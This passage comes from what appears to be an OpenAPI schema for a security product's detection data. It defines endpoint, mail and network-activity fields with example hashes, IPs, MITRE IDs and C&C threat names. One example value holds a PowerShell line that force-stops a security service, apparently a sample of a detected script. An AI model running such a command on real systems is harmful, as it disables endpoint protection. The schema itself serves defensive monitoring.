          },
          "parentCmd": {
            "type": "string"
          },
          "parentFileHashSha1": {
            "type": "string"
          },
          "parentFilePath": {
            "type": "string"
          },
          "processCmd": {
            "type": "string",
            "example": "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe --type=utility --lang=en-US --no-sandbox",
            "description": "Only applicable to the SLF_DetectionType = Process. The command line used to launch this process."
          },
          "processFileHashSha1": {
            "type": "string"
          },
          "processFilePath": {
            "type": "string",
            "example": "C:\\Program Files (x86)\\temp\\Application\\test.exe"
          },
          "request": {
            "type": "string",
            "example": "https://www.example.com",
            "description": "Request URL (normally detected by Web Reputation Services"
          },
          "searchDL": {
            "type": "string",
            "example": "SDL",
            "description": "Search data lake"
          },
          "spt": {
            "type": "integer",
            "nullable": true,
            "example": 8080,
            "description": "Source port"
          },
          "src": {
            "type": "string",
            "example": "192.169.1.1",
            "description": "Source IP address"
          },
          "srcFileHashSha1": {
            "type": "string"
          },
          "srcFilePath": {
            "type": "string"
          },
          "tags": {
            "type": "array",
            "nullable": true,
            "example": [
              "MITRE.T1210"
            ],
            "description": "Detected by Security Analytics Engine filters",
            "items": {
              "type": "string"
            }
          },
          "uuid": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
          }
        }
      },
      "ase-detectionsEndpointData": {
        "type": "object",
        "additionalProperties": true,
        "properties": {
          "act": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Block"
            ]
          },
          "actResult": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "File quarantined"
            ]
          },
          "aggregatedCount": {
            "type": "string",
            "example": "1"
          },
          "app": {
            "type": "string",
            "example": "HTTP"
          },
          "appGroup": {
            "type": "string",
            "example": "DNS Response"
          },
          "aptRelated": {
            "type": "string",
            "example": "0"
          },
          "behaviorCat": {
            "type": "string",
            "example": "Grey-Detection"
          },
          "bitwiseFilterRiskLevel": {
            "type": "integer",
            "example": 4
          },
          "blocking": {
            "type": "string",
            "example": "Web reputation"
          },
          "bmGroup": {
            "type": "string",
            "example": "logGenLocalDatetime:2022-01-25T10:17:09+00:00, act:Terminate, behaviorType:FileIO, ..."
          },
          "cat": {
            "type": "integer",
            "example": 50
          },
          "cccaDetection": {
            "type": "string",
            "example": "Yes"
          },
          "cccaDetectionSource": {
            "type": "string",
            "example": "GLOBAL_INTELLIGENCE"
          },
          "cccaRiskLevel": {
            "type": "integer",
            "example": 3
          },
          "channel": {
            "type": "string",
            "example": "Local file or network drive"
          },
          "clientFlag": {
            "type": "string",
            "example": "dst"
          },
          "cnt": {
            "type": "string",
            "example": "1"
          },
          "component": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "PATTERN_VSAPI 17.101.92 2021-09-30 04:23:27-07:00"
            ]
          },
          "compressedFileSize": {
            "type": "string",
            "example": "0"
          },
          "data": {
            "type": "string",
            "example": "#TM Services\\nStop-Service -Name \"ntrt\" -Force\\n ..."
          },
          "data0": {
            "type": "string",
            "example": "1"
          },
          "dceHash1": {
            "type": "string",
            "example": "0"
          },
          "dceHash2": {
            "type": "string",
            "example": "0"
          },
          "detailTrace": {
            "type": "integer",
            "example": 0
          },
          "detectionType": {
            "type": "string",
            "example": "File"
          },
          "deviceDirection": {
            "type": "string",
            "example": "outbound"
          },
          "deviceGUID": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
          },
          "deviceProcessName": {
            "type": "string",
            "example": "/snap/core/10126/usr/lib/snapd/snapd"
          },
          "deviceMacAddress": {
            "type": "string",
            "example": "00:11:22:33:44:55"
          },
          "devicePayloadId": {
            "type": "string",
            "example": "2:158:::"
          },
          "deviceRiskConfidenceLevel": {
            "type": "integer",
            "example": 3
          },
          "dhost": {
            "type": "string",
            "example": "samplehost"
          },
          "direction": {
            "type": "string",
            "example": "Outgoing"
          },
          "dmac": {
            "type": "string",
            "example": "00:11:22:33:44:55"
          },
          "domainName": {
            "type": "string",
            "example": "Workgroup"
          },
          "dpt": {
            "type": "integer",
            "example": 53
          },
          "dst": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "111.111.111.111"
            ]
          },
          "dstGroup": {
            "type": "string",
            "example": "Default"
          },
          "dstZone": {
            "type": "string",
            "example": "1"
          },
          "dvc": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "111.111.111.111"
            ]
          },
          "dvchost": {
            "type": "string",
            "example": "APEX-AGENT1"
          },
          "end": {
            "type": "string",
            "example": "2021-09-30T09:40:04-08:00"
          },
          "endpointGUID": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
            "description": "Host GUID of the endpoint on which the event was generated"
          },
          "endpointHostName": {
            "type": "string",
            "example": "xxx-docker",
            "description": "Hostname of the endpoint on which the event was generated"
          },
          "endpointIp": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "111.111.111.111"
            ],
            "description": "Endpoint IP address"
          },
          "endpointMacAddress": {
            "type": "string",
            "example": "XX-XX-XX-XX-XX-XX"
          },
          "engineOperation": {
            "type": "string",
            "example": "Open"
          },
          "engType": {
            "type": "string",
            "example": "Virus Scan Engine (Windows XP/Server 2003, x64)"
          },
          "engVer": {
            "type": "string",
            "example": "12.500.1004"
          },
          "enrichGpbPath": {
            "type": "string",
            "example": "s3://xdr-prod-us-east-1-sae-enriched-product-gpb/.../xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx_xxx.pb.gz"
          },
          "eventId": {
            "type": "string",
            "example": "100117"
          },
          "eventName": {
            "type": "string",
            "example": "INTEGRITY_MONITORING_EVENT",
            "description": "Predefined event enumerator"
          },
          "eventSubName": {
            "type": "string",
            "example": "Attack Discovery"
          },
          "eventTime": {
            "type": "integer",
            "example": 1602724592000
          },
          "eventTimeDT": {
            "type": "string",
            "example": "2021-06-10T01:38:38+00:00"
          },
          "fileHash": {
            "type": "string",
            "example": "3395856ce81f2b7382dee72602f798b642f14140"
          },
          "fileHashSha256": {
            "type": "string",
            "example": "39D8BA48A3C2FDC84D0A46451BF3B335407A91D39CA5C9A9A0AB6E89C1B7BB25"
          },
          "fileName": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Unconfirmed 145081.crdownload"
            ]
          },
          "fileOperation": {
            "type": "string",
            "example": "Deleted"
          },
          "filePath": {
            "type": "string",
            "example": "/etc/systemd/system",
            "description": "Full file path without file name"
          },
          "filePathName": {
            "type": "string",
            "example": "/etc/systemd/system/snap-xxxx-1246.xxxx",
            "description": "Full file path"
          },
          "fileSize": {
            "type": "string",
            "example": "0"
          },
          "fileVer": {
            "type": "string",
            "example": "10.0.18362.1"
          },
          "filterRiskLevel": {
            "type": "string",
            "example": "medium"
          },
          "firstAct": {
            "type": "string",
            "example": "Clean"
          },
          "firstActResult": {
            "type": "string",
            "example": "Unable to clean file"
          },
          "fullPath": {
            "type": "string",
            "example": "C:\\\\Users\\\\user1\\\\Downloads\\\\Unconfirmed 145081.crdownload"
          },
          "hasdtasres": {
            "type": "string",
            "example": "No"
          },
          "hostId": {
            "type": "integer",
            "example": 67
          },
          "hostName": {
            "type": "string",
            "example": "samplehost"
          },
          "hostSeverity": {
            "type": "integer",
            "example": 4
          },
          "httpReferer": {
            "type": "string",
            "example": "http://xxx.xxxxxx.com/"
          },
          "instanceId": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
          },
          "interestedGroup": {
            "type": "string",
            "example": "Default"
          },
          "interestedHost": {
            "type": "string",
            "example": "xxx-docker",
            "description": "Highlighted indicator for incident response members"
          },
          "interestedIp": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "192.168.47.102"
            ],
            "description": "Highlighted indicator for incident response members"
          },
          "interestedMacAddress": {
            "type": "string",
            "example": "00:11:22:33:44"
          },
          "isHidden": {
            "type": "string",
            "example": "Yes"
          },
          "logKey": {
            "type": "string",
            "example": "XXXXXXXXXXXX-XXXXXXXX-XXXX-XXXX-XXXX_xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx_xxx..."
          },
          "logSubType": {
            "type": "string",
            "example": "base"
          },
          "malDst": {
            "type": "string",
            "example": "apex-agent1"
          },
          "malName": {
            "type": "string",
            "example": "Eicar_test_1"
          },
          "malSrc": {
            "type": "string",
            "example": "\\\\\\\\10.0.x.xx\\\\Austin"
          },
          "malSubType": {
            "type": "string",
            "example": "Unknown"
          },
          "malType": {
            "type": "string",
            "example": "Virus/Malware"
          },
          "malTypeGroup": {
            "type": "string",
            "example": "Others"
          },
          "mDevice": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "10.0.0.x",
              "xxxx::xxxx:xxxx:xxxx:xxxx"
            ]
          },
          "mDeviceGUID": {
            "type": "string",
            "example": "C5B09EDD-C725-907F-29D9-B8C30D18C48F"
          },
          "mitreMapping": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "T1090 (TA0005)"
            ]
          },
          "mitreVersion": {
            "type": "string",
            "example": "v6"
          },
          "mpname": {
            "type": "string",
            "example": "Cloud One - Workload Security"
          },
          "mpver": {
            "type": "string",
            "example": "Deep Security/20.0.222"
          },
          "msg": {
            "type": "string",
            "example": "All components are up-to-date"
          },
          "objectCmd": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe --profile-directory=Default"
            ]
          },
          "objectCreateDispositions": {
            "type": "integer",
            "example": 5
          },
          "objectDesiredAccess": {
            "type": "integer",
            "example": 146410
          },
          "objectEntityName": {
            "type": "string",
            "example": "ads_file"
          },
          "objectFileHashMd5": {
            "type": "string",
            "example": "761AEFF7E6B110970285B9C20C9E1DCA"
          },
          "objectFileHashSha1": {
            "type": "string",
            "example": "00496B4D53CEFE031B9702B3385C9F4430999932"
          },
          "objectFileHashSha256": {
            "type": "string",
            "example": "7778ED68F4646BAA38C4F36B16A1AE393ACECD694948102B5CF0773AB08237D7"
          },
          "objectFileName": {
            "type": "string",
            "example": "Unconfirmed 142899.crdownload:SmartScreen"
          },
          "objectFilePath": {
            "type": "string",
            "example": "C:\\\\Users\\\\user1\\\\Downloads\\\\Unconfirmed 142899.crdownload:SmartScreen"
          },
          "objectFirstRecorded": {
            "type": "string",
            "example": "2021-06-09T18:31:09-07:00"
          },
          "objectName": {
            "type": "string",
            "example": "CloudEndpointService.exe"
          },
          "objectNewDesiredAccess": {
            "type": "integer",
            "example": 144256
          },
          "objectPid": {
            "type": "integer",
            "example": 7660
          },
          "objectRegistryData": {
            "type": "string",
            "format": "byte",
            "example": "AQAAANCMnd8BF...zVCduQ=="
          },
          "objectRegistryKeyHandle": {
            "type": "string",
            "example": "HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\Trend Micro Endpoint Basecamp"
          },
          "objectRegistryRoot": {
            "type": "string",
            "example": "HKLM"
          },
          "objectRegistryValue": {
            "type": "string",
            "example": "FailureActions"
          },
          "objectRegType": {
            "type": "integer",
            "example": 3
          },
          "objectSigner": {
            "type": "array",
            "example": [
              "Microsoft Windows"
            ],
            "items": {
              "type": "string"
            }
          },
          "objectSignerValid": {
            "type": "array",
            "items": {
              "type": "boolean"
            },
            "example": [
              true
            ]
          },
          "objectType": {
            "type": "string",
            "example": "file"
          },
          "objectUser": {
            "type": "string",
            "example": "user1"
          },
          "operationLevel": {
            "type": "integer",
            "example": 1
          },
          "overSsl": {
            "type": "string",
            "example": "Not over SSL/TLS"
          },
          "parentCmd": {
            "type": "string",
            "example": "C:\\\\WINDOWS\\\\system32\\\\svchost.exe -k DcomLaunch -p"
          },
          "parentFileHashMd5": {
            "type": "string"
          },
          "parentFileHashSha1": {
            "type": "string"
          },
          "parentFileHashSha256": {
            "type": "string"
          },
          "parentFilePath": {
            "type": "string",
            "example": "C:\\\\Windows\\\\System32\\\\svchost.exe"
          },
          "parentName": {
            "type": "string",
            "example": "svchost.exe"
          },
          "parentPid": {
            "type": "integer"
          },
          "parentSigner": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Microsoft Windows Publisher"
            ]
          },
          "parentSignerValid": {
            "type": "array",
            "items": {
              "type": "boolean"
            },
            "example": [
              true
            ]
          },
          "pAttackPhase": {
            "type": "string",
            "example": "Point of Entry"
          },
          "patType": {
            "type": "string",
            "example": "NCIE CNC Pattern"
          },
          "patVer": {
            "type": "string",
            "example": "35.1062.00"
          },
          "pComp": {
            "type": "string",
            "example": "Scan Module"
          },
          "peerGroup": {
            "type": "string",
            "example": "Default"
          },
          "peerHost": {
            "type": "string",
            "example": "samplehost"
          },
          "peerIp": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "11.11.11.11"
            ]
          },
          "pname": {
            "type": "string",
            "example": "Apex One"
          },
          "policyId": {
            "type": "string",
            "example": "Self-Protection"
          },
          "policyName": {
            "type": "string",
            "example": "Internal User Policy"
          },
          "potentialRisk": {
            "type": "string",
            "example": "1"
          },
          "processCmd": {
            "type": "string",
            "example": "-ServerName:App.AppX9yct9q388jvt4h7y0gn06smzkxcsnt8m.mca"
          },
          "processFileHashMd5": {
            "type": "string"
          },
          "processFileHashSha1": {
            "type": "string"
          },
          "processFileHashSha256": {
            "type": "string"
          },
          "processFilePath": {
            "type": "string",
            "example": "C:\\\\Program Files (x86)\\\\Microsoft\\\\Edge\\\\Application\\\\msedge.exe"
          },
          "processName": {
            "type": "string"
          },
          "processPid": {
            "type": "integer"
          },
          "processSigner": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Microsoft Windows Publisher",
              "Microsoft Windows"
            ],
            "description": "The signer name list of the subject process"
          },
          "processSignerValid": {
            "type": "array",
            "items": {
              "type": "boolean"
            }
          },
          "productCode": {
            "type": "string",
            "example": "sao"
          },
          "pver": {
            "type": "string",
            "example": "20.0.0.877"
          },
          "rating": {
            "type": "string",
            "example": "Dangerous"
          },
          "remarks": {
            "type": "string",
            "example": "[\"Server IP Address: 11.11.11.11\"]"
          },
          "request": {
            "type": "string",
            "example": "https://example.com"
          },
          "requestClientApplication": {
            "type": "string",
            "example": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0"
          },
          "riskConfidenceLevel": {
            "type": "string",
            "example": "1"
          },
          "riskLevel": {
            "type": "string",
            "example": "1"
          },
          "rt": {
            "type": "string",
            "example": "2020-10-15T01:16:32.000Z"
          },
          "rt_utc": {
            "type": "string",
            "example": "2020-10-15T01:16:32.000Z"
          },
          "rtDate": {
            "type": "string",
            "example": "2020-10-15T00:00:00.000Z"
          },
          "rtHour": {
            "type": "integer",
            "example": 1
          },
          "rtWeekDay": {
            "type": "string",
            "example": "Thursday"
          },
          "ruleId": {
            "type": "integer",
            "example": "1003513"
          },
          "ruleName": {
            "type": "string",
            "example": "Unix - File attributes changed in /etc location"
          },
          "ruleType": {
            "type": "string",
            "example": "unknown"
          },
          "sAttackPhase": {
            "type": "string",
            "example": "Command and Control Communication"
          },
          "scanType": {
            "type": "string",
            "example": "Real-time Scan"
          },
          "score": {
            "type": "integer",
            "example": 49
          },
          "searchDL": {
            "type": "string",
            "example": "DDL"
          },
          "secondAct": {
            "type": "string",
            "example": "Move"
          },
          "secondActResult": {
            "type": "string",
            "example": "File quarantined"
          },
          "senderGUID": {
            "type": "string",
            "example": "CE11DF0D-0CFF-CD82-D23E-ACE18C5E1B18"
          },
          "senderIp": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "10.0.0.x",
              "xxxx::xxxx:xxxx:xxxx:xxxx"
            ]
          },
          "severity": {
            "type": "integer",
            "example": 6
          },
          "shost": {
            "type": "string",
            "example": "samplehost"
          },
          "smac": {
            "type": "string",
            "example": "00:11:22:33:44:55"
          },
          "spt": {
            "type": "integer",
            "example": 58871
          },
          "src": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": "Malicious_identified_CnC_querying_on_UDP_detected"
          },
          "srcGroup": {
            "type": "string",
            "example": "Default"
          },
          "srcZone": {
            "type": "string",
            "example": "1"
          },
          "suid": {
            "type": "string",
            "example": "root",
            "description": "Logon user"
          },
          "tacticId": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "TA0005"
            ]
          },
          "tags": {
            "type": "array",
            "nullable": true,
            "items": {
              "type": "string"
            },
            "example": [
              "XSAE.F2140",
              "XSAE.F3066"
            ]
          },
          "threatName": {
            "type": "string",
            "example": "Malicious_identified_CnC_querying_on_UDP_detected"
          },
          "threatType": {
            "type": "string",
            "example": "2"
          },
          "ticReceivedTime": {
            "type": "string",
            "example": "2020-10-15T01:34:05.475Z"
          },
          "urlCat": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "C&C Server"
            ]
          },
          "uuid": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
          },
          "vLANId": {
            "type": "integer",
            "example": 4095
          }
        }
      },
      "ase-detectionsMailData": {
        "type": "object",
        "additionalProperties": true,
        "properties": {
          "act": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Quarantine"
            ]
          },
          "actResult": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "File quarantined"
            ]
          },
          "aggregatedCount": {
            "type": "integer",
            "example": 1
          },
          "app": {
            "type": "string",
            "example": "HTTPS"
          },
          "appGroup": {
            "type": "string",
            "example": "TCP"
          },
          "aptRelated": {
            "type": "integer",
            "example": 0
          },
          "attachmentFileName": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Mail Body"
            ]
          },
          "bitwiseFilterRiskLevel": {
            "type": "integer",
            "example": 4
          },
          "clientFlag": {
            "type": "string",
            "example": "dst"
          },
          "cnt": {
            "type": "string",
            "example": 1
          },
          "compressedFileSize": {
            "type": "string",
            "example": 0
          },
          "dataType": {
            "type": "integer",
            "example": 1
          },
          "dceHash1": {
            "type": "string",
            "example": 0
          },
          "dceHash2": {
            "type": "string",
            "example": 0
          },
          "description": {
            "type": "string",
            "example": "The embedded URL is new-born claimed by WRS service"
          },
          "detectionType": {
            "type": "string",
            "example": "Blocked URL List"
          },
          "deviceDirection": {
            "type": "string",
            "example": "inbound"
          },
          "deviceGUID": {
            "type": "string",
            "example": "95E2AE18FD65-43159B6D-A071-F033-3274"
          },
          "deviceMacAddress": {
            "type": "string",
            "example": "00:11:22:33:44:55"
          },
          "devicePayloadId": {
            "type": "string",
            "example": "2:33725804:::"
          },
          "deviceRiskConfidenceLevel": {
            "type": "integer",
            "example": 3
          },
          "dhost": {
            "type": "string",
            "example": "xxxxxx.xxx.xx.xxx.com",
            "description": "Destination host (hostname | IP address | domain)"
          },
          "dmac": {
            "type": "string",
            "example": "00:11:22:33:44:55"
          },
          "domainName": {
            "type": "string",
            "example": "Microsoft Corporation"
          },
          "dpt": {
            "type": "integer",
            "example": 65379,
            "description": "Destination port"
          },
          "dst": {
            "type": "string",
            "example": "10.100.110.120",
            "description": "Destination IP address"
          },
          "dstGroup": {
            "type": "string",
            "example": "My Company 5F"
          },
          "dstZone": {
            "type": "integer",
            "example": 1
          },
          "duser": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "xxxxxxxxxxxx@xxxxxx.onmicrosoft.com"
            ]
          },
          "dvc": {
            "type": "string",
            "example": "10.100.100.200"
          },
          "dvchost": {
            "type": "string",
            "example": "xxxx-209"
          },
          "enrichGpbPath": {
            "type": "string",
            "example": "s3://xdr-prod-us-east-1-sae-enriched-product-gpb/.../xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx_xxx.pb.gz"
          },
          "eventId": {
            "type": "string",
            "example": "100119"
          },
          "eventName": {
            "type": "string",
            "example": "SECURITY_RISK_DETECTION",
            "description": "Predefined event enumerator"
          },
          "eventSubName": {
            "type": "string",
            "example": "Web Security Violation"
          },
          "eventTime": {
            "type": "integer",
            "example": 1602734231000
          },
          "eventTimeDT": {
            "type": "string",
            "example": "2021-06-10T01:38:38+00:00"
          },
          "fileSize": {
            "type": "integer",
            "example": 0
          },
          "filterName": {
            "type": "string",
            "example": "Web Reputation"
          },
          "filterRiskLevel": {
            "type": "string",
            "example": "medium"
          },
          "groupIdCorrKey": {
            "type": "string",
            "example": "SENDER_DOMAIN"
          },
          "groupIdCorrValues": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "outlook.com"
            ]
          },
          "hasdtasres": {
            "type": "string",
            "example": "No"
          },
          "highlightedRequest": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "http://example.com"
            ]
          },
          "hostName": {
            "type": "string",
            "example": "DigiCert Inc",
            "description": "Hostname of the endpoint on which the event was generated"
          },
          "hostSeverity": {
            "type": "integer",
            "example": 1,
            "description": "Host severity is based on the aggregation and correlation of the severity of the events that affect a host. If several events affect a host and have no detected connection, the host severity will be based on the highest event severity of those events. However, if the events have a detected correlation, the host severity level will increase accordingly."
          },
          "interestedGroup": {
            "type": "string",
            "example": "My Company 5F"
          },
          "interestedHost": {
            "type": "string",
            "example": "xxxxxx.xxx.xx.xxx.com",
            "description": "Highlighted indicator for incident response members"
          },
          "interestedIp": {
            "type": "string",
            "example": "10.200.200.250",
            "description": "Highlighted indicator for incident response members"
          },
          "ircUserName": {
            "type": "string",
            "example": "DigiCert SHA2 Secure Server CA"
          },
          "ja3sHash": {
            "type": "string",
            "example": "aaafe5d15ae567fb35fd7837f0116bbb"
          },
          "logKey": {
            "type": "string",
            "example": "XXXXXXXXXXXX-XXXXXXXX-XXXX-XXXX-XXXX_xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx_xxx..."
          },
          "mailbox": {
            "type": "string",
            "example": "xxxxxxxxxxxx@xxxxxxx.onmicrosoft.com"
          },
          "mailFolder": {
            "type": "string",
            "example": "xxxxxxxxxxxx@xxxxxxx.onmicrosoft.com\\\\Inbox"
          },
          "mailMsgId": {
            "type": "string",
            "example": "<xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx@mail.xxxxxxx.com>"
          },
          "mailMsgSubject": {
            "type": "string",
            "example": "xxx.xxxx.com"
          },
          "mailReceivedTime": {
            "type": "string",
            "example": "2021-06-10T12:37:33+0000"
          },
          "mailUniqueId": {
            "type": "string",
            "example": "AAMkADBmMmIxNDg4LWRkMTgtNGFiZi05NTQ2LTJmOTA0YTE1YTI5MwBGAAAAAAD-JikVxEKVSpZ1gIBgugqHBwBvNx_XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
          },
          "malType": {
            "type": "string",
            "example": "OTHERS"
          },
          "malTypeGroup": {
            "type": "string",
            "example": "Others"
          },
          "mitreMapping": {
            "type": "array",
            "example": [
              "T1032 (TA0011)",
              "T1043 (TA0011)",
              "T1071 (TA0011)"
            ],
            "items": {
              "type": "string"
            }
          },
          "msgId": {
            "type": "string",
            "example": "xxxxxxxx.xxxxxxxx.xxxx.xxxx@mx.google.com"
          },
          "msgUuid": {
            "type": "string",
            "example": "AAkALgAAAAAAHYQDEapmEc2byACqAC-EWg0AbzcfjDdk4kKW4dVsu3szGQABAAAAAAAA"
          },
          "objectType": {
            "type": "string",
            "example": "url"
          },
          "orgId": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
          },
          "overSsl": {
            "type": "string",
            "example": "Not over SSL/TLS"
          },
          "pComp": {
            "type": "string",
            "example": "NCIE",
            "description": "Detection engine/component"
          },
          "peerHost": {
            "type": "string",
            "example": "40.190.200.200"
          },
          "peerIp": {
            "type": "string",
            "example": "40.190.200.200",
            "description": "The peer IP address is the IP address of the other end of the tunnel. From the client endpoint, the peer IP address would be the IP address of the router"
          },
          "pname": {
            "type": "string",
            "example": "Deep Discovery Inspector"
          },
          "policyName": {
            "type": "string",
            "example": "Default Policy"
          },
          "potentialRisk": {
            "type": "integer",
            "example": 1
          },
          "productCode": {
            "type": "string",
            "example": "sca"
          },
          "pver": {
            "type": "string",
            "example": "5.7.1111"
          },
          "remarks": {
            "type": "string",
            "example": "{suser:\"xxxxxxx\"<xxxxxxx@xxxxx.com>, duser:[\"\\\"xxxxxxx\\\"<xxxxxxxx@xxxxxxx.onmicrosoft.com>\"]}"
          },
          "request": {
            "type": "string",
            "example": "[\"https://example.com\"]"
          },
          "requests": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "https://example.com"
            ]
          },
          "rt": {
            "type": "string",
            "example": "2020-10-15T03:57:11.000Z"
          },
          "rt_utc": {
            "type": "string",
            "example": "2020-10-15T03:57:11.000Z"
          },
          "rtDate": {
            "type": "string",
            "example": "2020-10-15T00:00:00.000Z"
          },
          "rtHour": {
            "type": "integer",
            "example": 11
          },
          "rtWeekDay": {
            "type": "string",
            "example": "Thursday"
          },
          "ruleId": {
            "type": "integer",
            "example": 4142
          },
          "ruleName": {
            "type": "string",
            "example": "SSL Connection"
          },
          "ruleVer": {
            "type": "string",
            "example": ""
          },
          "samUser": {
            "type": "string",
            "example": "user1"
          },
          "scanTs": {
            "type": "string",
            "example": "2021-11-29T23:27:42+0000"
          },
          "scanType": {
            "type": "string",
            "example": "exchange_mailbox_realtime_detection_logs"
          },
          "searchDL": {
            "type": "string",
            "example": "DDL"
          },
          "senderGUID": {
            "type": "string",
            "example": "95E2AE18FD65-43159B6D-A071-F033-3274"
          },
          "senderIp": {
            "type": "string",
            "example": "10.100.100.200"
          },
          "severity": {
            "type": "string",
            "example": 2
          },
          "shost": {
            "type": "string",
            "example": "40.190.200.200",
            "description": "Source host (hostname | IP address | domain)"
          },
          "smac": {
            "type": "string",
            "example": "00:22:33:44:55:66"
          },
          "spt": {
            "type": "integer",
            "example": 443,
            "description": "Source port"
          },
          "src": {
            "type": "string",
            "example": "40.90.23.154",
            "description": "Source IP address"
          },
          "srcZone": {
            "type": "integer",
            "example": 0,
            "description": "0 Not in monitored network, 1 In monitored network and trusted, 2 In monitored network and untrusted"
          },
          "suid": {
            "type": "string",
            "example": "xxxxxxxx@xxxxxxxx.onmicrosoft.com"
          },
          "suser": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "xxxxxxxxx@xxxxx.com"
            ]
          },
          "tacticId": {
            "type": "string",
            "example": "TA0011",
            "description": "Detected by Security Agent or product policy"
          },
          "tags": {
            "type": "array",
            "nullable": true,
            "items": {
              "type": "string"
            },
            "example": [
              "XSAE.F2140",
              "XSAE.F3066"
            ]
          },
          "targetShare": {
            "type": "string",
            "example": "Washington"
          },
          "techniqueId": {
            "type": "array",
            "example": [
              "T1043",
              "T1032",
              "T1071"
            ],
            "description": "Detected by Security Agent or product policy",
            "items": {
              "type": "string"
            }
          },
          "ticReceivedTime": {
            "type": "string",
            "example": "2020-10-15T03:57:22.309Z"
          },
          "threatType": {
            "type": "integer",
            "example": 2,
            "description": "6-Disruptive Applications, 3-Exploits , 4-Grayware , 1-Malicious Behavior, 0-Malicious Content, 2-Suspicious Behavior, 5-Web Reputation"
          },
          "vLANId": {
            "type": "string",
            "example": 4095
          },
          "uuid": {
            "type": "string",
            "example": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
          }
        }
      },
      "ase-networkActivityData": {
        "type": "object",
        "additionalProperties": true,
        "properties": {
          "flow_id": {
            "type": "integer",
            "example": 6869615772654816000
          },
          "eth_src": {
            "type": "string",
            "example": "00-9a-00-9a-00-9a"
          },
          "eth_dest": {
            "type": "string",
            "example": "12-34-56-78-9a-bc"
          },
          "ip_src": {
            "type": "string",
            "example": "10.100.100.100"
          },
          "ip_dest": {
            "type": "string",
            "example": "133.133.133.133"
          },
          "snsr_id": {
            "type": "string",
            "example": "0721a14ce3cf4241b19da64f70bd5b45"
          },
          "proto": {
            "type": "string",
            "example": "HTTPS"
          },
          "start_ts": {
            "type": "number",
            "example": 1599457062.452471
          },
          "end_ts": {
            "type": "number",
            "example": 1599457062.539947
          },
          "day": {
            "type": "integer",
            "example": 18512
          },
          "src_port": {
            "type": "string",
            "example": "57567"
          },
          "dest_port": {
            "type": "string",
            "example": "443"
          },
          "tcp_or_udp": {
            "type": "string",
            "example": "TCP"
          },
          "req_method_list": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "GET"
            ]
          },
          "req_ts_list": {
            "type": "array",
            "items": {
              "type": "number"
            },
            "example": [
              1633114803.253829
            ]
          },
          "req_uri_full_list": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "http://xxx.xxxxxx.com/favicon.ico"
            ]
          },
          "req_server_list": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "xxx.xxxxxx.com"
            ]
          },
          "req_user_agent_list": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0"
            ]
          },
          "req_date_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "req_mime_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "req_sha1_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "req_archfiles_sha1": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "req_sha256_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "req_archfiles_sha256": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "req_referer_list": {
            "type": "array",
            "items": {
              "type": "string"
            },
            "example": [
              "http://xxx.xxxxxx.com/"
            ]
          },
          "resp_code_list": {
            "type": "array",
            "items": {
              "type": "string"
            }
          },
          "resp_date_list": {
            "type": "array",
            "items": {
